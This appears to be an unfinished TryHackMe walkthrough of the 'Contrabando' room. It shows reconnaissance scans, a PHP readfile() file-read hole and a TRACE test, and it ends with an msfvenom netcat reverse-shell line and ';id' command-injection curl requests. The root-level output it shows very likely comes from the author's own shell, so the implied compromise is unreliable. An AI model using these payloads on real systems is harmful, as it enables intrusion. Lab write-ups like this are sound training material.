<h1 align="center">Contrabando</h1>
<p align="center">2025, August 15<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>466</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Never tell me the odds.</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/5a1e2441-6336-4ce2-8100-1032df5091bc"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/theblobblog">here </a>.<br>
<img width="1200px" src=""></p>

<br>
<br>

<h2>Task 1 . Capture the Flags!</h2>
<p>Our company was excited to release our new product, but a recent attack has forced us to go down for maintenance. They have asked you to conduct a vulnerability assessment to help identify how the attack occurred.<br>

Are you up for it?<br>

Great kid! Don't get cocky.<br>

Please allow the VM 5 minutes to fully boot up.</p>

<br>
<p><em>Answer the questions below</em></p>

<p>1.1. What is the first flag?<br>
<code>_________________________</code></p>

<br>

<p>1.2. What is the second flag?<br>
<code>_________________________</code></p>

<br>

<h2 align="center">Enumeration</h2>
<br>
<br>
<h3>Nikto</h3>

```bash
:~/Contrabando# nikto -h  xx.xxx.xx.xx
...
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xx
+ Target Hostname:    contrabando.thm
+ Target Port:        80
+ Start Time:         2025-08-15 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.55 (Unix)
+ Server leaks inodes via ETags, header found with file /, fields: 0x39a 0x61bab54709d80 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-08-15 xx:x:xx (GMT1) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<br>
<br>
<h3>ping</h3>

```bash
:~/Contrabando# ping -c 4 xx.xxx.xx.xx
PING xx.xxx.xx.xx (xx.xxx.xx.xx) 56(84) bytes of data.
64 bytes from xx.xxx.xx.xx: icmp_seq=1 ttl=64 time=0.289 ms
64 bytes from xx.xxx.xx.xx: icmp_seq=2 ttl=64 time=0.268 ms
64 bytes from xx.xxx.xx.xx: icmp_seq=3 ttl=64 time=0.258 ms
64 bytes from xx.xxx.xx.xx: icmp_seq=4 ttl=64 time=0.253 ms

--- xx.xxx.xx.xx ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3050ms
rtt min/avg/max/mdev = 0.253/0.267/0.289/0.013 ms
```

<br>
<br>
<h3>Traceroute</h3>

```bash
:~/Contrabando# traceroute xx.xxx.xx.xx
traceroute to xx.xxx.xx.xx (xx.xxx.xx.xx), 30 hops max, 60 byte packets
 1  * * *
 2  * * *
 3  * * *
 4  * * *
 5  * * *
 6  * * *
 7  * * *
 8  * * *
 9  * * *
10  * * *
11  * * *
12  * * *
13  * * *
14  * * *
15  * * *
16  * * *
17  * * *
18  * * *
19  * * *
20  * * *
21  * * *
22  * * *
23  * * *
24  * * *
25  * * *
26  * * *
27  * * *
28  * * *
29  * * *
30  * * *
```

<br>

<br>
<br>
<h3>Nmap</h3>

<p>

- 22 : ssh<br>
- 80 : http</p>

<br>

```bash
:~/Contrabando# nmap -sT -p- -T4 xx.xxx.xx.xx
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp

open  http
```

<br>

```bash
:~/Contrabando# nmap -A --min-rate=1000 xx.xxx.xx.xx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.55 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.55 (Unix)
|_http-title: Site doesn't have a title (text/html).
```

<br>
<br>

```bash
:~/Contrabando# nmap -p-xx.xxx.xx.xx --open
...
PORT   STATE SERVICE VERSION
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

<br>
<br>

```bash
:~/Contrabando# nmap -p80 -A xx.xxx.xx.xx
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.55 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.55 (Unix)
|_http-title: Site doesn't have a title (text/html).
...
TRACEROUTE
HOP RTT     ADDRESS
1   0.21 ms ip-xx.xxx.xx.xx.ec2.internal (xx.xxx.xx.xx)
```

<br>

<img width="1117" height="114" alt="image" src="https://github.com/user-attachments/assets/ac542bc0-35c1-4fb0-a0ab-cf2ea0218e99" />


<br>


```bash
:~/Contrabando# nmap -T4 -A -v --max-rtt-timeout 1500ms --min-rate 4500 --max-os-tries 1 -Pn --osscan-limit 1 --script vuln,http-enum,smb-enum-shares.nse xx.xxx.xx.xx
...
PORT   STATE SERVICE
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
...
80/tcp open  http    Apache httpd 2.4.55 ((Unix))
| http-enum: 
|_  /page/: Potentially interesting folder
|_http-server-header: Apache/2.4.55 (Unix)
...
|_http-trace: TRACE is enabled

open  http
```

<br>
<br>
<h3>Dirsearch</h3>

```bash
:~/Contrabando# dirsearch -u http://xx.xxx.xx.xx
...
[xx:xx:xx] 200 -  820B  - /cgi-bin/printenv
[xx:xx:xx] 200 -    1KB - /cgi-bin/test-cgi

Task Completed
```

<br>

```bash
:~/Contrabando# dirsearch -u http://xx.xxx.xx.xx/ -t 100 -i 200
...
[xx:xx:xx] 200 -    1KB - /cgi-bin/test-cgi
[xx:xx:xx] 200 -  820B  - /cgi-bin/printenv
```

<br>

```bash
:~/Contrabando# dirsearch -u http://xx.xxx.xx.xx/cgi-bin/printenv/ -t 100 -i 200
...
[xx:xx:xx] 200 -    1KB - /cgi-bin/test-cgi
[xx:xx:xx] 200 -  820B  - /cgi-bin/printenv
```

<br>

```bash
:~/Contrabando# dirsearch -u http://xx.xxx.xx.xx/ -t 100 -i 200
...
[xx:xx:xx] 200 -    1KB - /cgi-bin/test-cgi
[xx:xx:xx] 200 -  820B  - /cgi-bin/printenv
```



<br>
<br>

```bash
:~/Contrabando# dirsearch -u http://xx.xxx.xx.xxx/page/ -t 100 -i 200
[xx:xx:xx] 200 -  445B  - /page/home.html
[xx:xx:xx] 200 -  140B  - /page/index.php
```

<br>
<br>
<h3>Gobuster</h3>

```bash
:~/Contrabando# gobuster dir --wordlist=/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt --url=http://xx.xxx.xx.xx/ -t 100 --no-error -d 404,403
...
/index.html           (Status: 200) [Size: 922]
...
/.                    (Status: 200) [Size: 922]
```


<br>
<br>

<h3>/page/home.html>/h3>

<img width="1122" height="578" alt="image" src="https://github.com/user-attachments/assets/39be057d-a09d-4d60-b974-e1d535e1aa76" />

<br>

<img width="1132" height="384" alt="image" src="https://github.com/user-attachments/assets/66ff1b11-a924-4bd9-8cc5-b1eafeb6fa28" />

<br>
<br>

<h3>/page/index.php>/h3>

<img width="1122" height="578" alt="image" src="https://github.com/user-attachments/assets/39be057d-a09d-4d60-b974-e1d535e1aa76" />


```bash
<?php 

$page = $_GET['page'];
if (isset($page)) {
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

<br>
<br>
<h3>/page/index.php?page=html</h3>

<img width="1126" height="392" alt="image" src="https://github.com/user-attachments/assets/553ab13c-441e-4283-ab30-07b2e707cabe" />

<br>
<br>
<h3>/cgi-bin/test-cgi</h3>

<img width="1124" height="551" alt="image" src="https://github.com/user-attachments/assets/72584493-105f-41fc-a8be-53938ff4948c" />


<br>
<br>
<img width="1270" height="322" alt="image" src="https://github.com/user-attachments/assets/3eb59635-ff82-4d03-9003-8e3103dfb092" />

<br>
<br>

<p>The server indeed accepts the TRACE method.</p>

```bash
:~/Contrabando# curl -X TRACE http://xx.xxx.xx.xx -H "Cookie: sessionid=12345"
TRACE / HTTP/1.1
Host: 10.201.66.57
User-Agent: curl/7.68.0
Accept: */*
Cookie: sessionid=12345
```


<img width="1350" height="167" alt="image" src="https://github.com/user-attachments/assets/9f7f808d-c1b0-4d65-bb56-1aba0a331a5e" />

<p>The server indeed accepts the TRACE method.</p>

```bash
:~/Contrabando# curl http://xx.xxx.xx.xx/cgi-bin/test-cgi
#

# To permit this cgi, replace # on the first line above with the
# appropriate #!/path/to/sh shebang, and set this script executable
# with chmod 755.
#
# ***** !!! WARNING !!! *****
# This script echoes the server environment variables and therefore
# leaks information - so NEVER use it in a live server environment!
# It is provided only for testing purpose.
# Also note that it is subject to cross site scripting attacks on
# MS IE and any other browser which fails to honor RFC2616. 

# disable filename globbing
set -f

echo "Content-type: text/plain; charset=iso-8859-1"
echo

echo CGI/1.0 test script report:
echo

echo argc is $#. argv is "$*".
echo

echo SERVER_SOFTWARE = $SERVER_SOFTWARE
echo SERVER_NAME = $SERVER_NAME
echo GATEWAY_INTERFACE = $GATEWAY_INTERFACE
echo SERVER_PROTOCOL = $SERVER_PROTOCOL
echo SERVER_PORT = $SERVER_PORT
echo REQUEST_METHOD = $REQUEST_METHOD
echo HTTP_ACCEPT = "$HTTP_ACCEPT"
echo PATH_INFO = "$PATH_INFO"
echo PATH_TRANSLATED = "$PATH_TRANSLATED"
echo SCRIPT_NAME = "$SCRIPT_NAME"
echo QUERY_STRING = "$QUERY_STRING"
echo REMOTE_HOST = $REMOTE_HOST
echo REMOTE_ADDR = $REMOTE_ADDR
echo REMOTE_USER = $REMOTE_USER
echo AUTH_TYPE = $AUTH_TYPE
echo CONTENT_TYPE = $CONTENT_TYPE
echo CONTENT_LENGTH = $CONTENT_LENGTH
```

<br>


```bash
:~/Contrabando# tcpdump ip proto \\icmp -i ens5
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens5, link-type EN10MB (Ethernet), capture size 262144 bytes
xx:xx:xx.872237 IP ip-xx-xxx-xx-xx.ec2.internal > scanner-011.ch1.censys-scanner.com: ICMP ip-xx-xxx-xx-xx.ec2.internal udp port 8894 unreachable, length 83
xx:xx:xx.193444 IP ec2-xx-xxx-xxx-xxx.ap-southeast-1.compute.amazonaws.com > ip-xx-xxx-xx-xx.ec2.internal: ICMP echo reply, id 16509, seq 14618, length 8
```

<br>

```bash
:~# msfvenom -p cmd/unix/reverse_netcat lhost=xx.xxx.xx.xx lport=4444 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 102 bytes
mkfifo /tmp/aviuouu; nc xx.xxx.xx.xx 4444 0</tmp/aviuouu | /bin/sh >/tmp/aviuouu 2>&1; rm /tmp/aviuouu
```

<br>

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
```



<br>

```bash
:~/Contrabando# curl http://xx.xxx.xx.xx/cgi-bin/test-cgi?test=;id
#

# To permit this cgi, replace # on the first line above with the
# appropriate #!/path/to/sh shebang, and set this script executable
# with chmod 755.
#
# ***** !!! WARNING !!! *****
# This script echoes the server environment variables and therefore
# leaks information - so NEVER use it in a live server environment!
# It is provided only for testing purpose.
# Also note that it is subject to cross site scripting attacks on
# MS IE and any other browser which fails to honor RFC2616. 

# disable filename globbing
set -f

echo "Content-type: text/plain; charset=iso-8859-1"
echo

echo CGI/1.0 test script report:
echo

echo argc is $#. argv is "$*".
echo

echo SERVER_SOFTWARE = $SERVER_SOFTWARE
echo SERVER_NAME = $SERVER_NAME
echo GATEWAY_INTERFACE = $GATEWAY_INTERFACE
echo SERVER_PROTOCOL = $SERVER_PROTOCOL
echo SERVER_PORT = $SERVER_PORT
echo REQUEST_METHOD = $REQUEST_METHOD
echo HTTP_ACCEPT = "$HTTP_ACCEPT"
echo PATH_INFO = "$PATH_INFO"
echo PATH_TRANSLATED = "$PATH_TRANSLATED"
echo SCRIPT_NAME = "$SCRIPT_NAME"
echo QUERY_STRING = "$QUERY_STRING"
echo REMOTE_HOST = $REMOTE_HOST
echo REMOTE_ADDR = $REMOTE_ADDR
echo REMOTE_USER = $REMOTE_USER
echo AUTH_TYPE = $AUTH_TYPE
echo CONTENT_TYPE = $CONTENT_TYPE
echo CONTENT_LENGTH = $CONTENT_LENGTH
uid=0(root) gid=0(root) groups=0(root),998(docker),1001(rvm)
```

<br>

<br>

```bash
:~/Contrabando# curl http://xx.xxx.xx.xx/cgi-bin/test-cgi?test=;pwd
...
/root/Contrabando
```



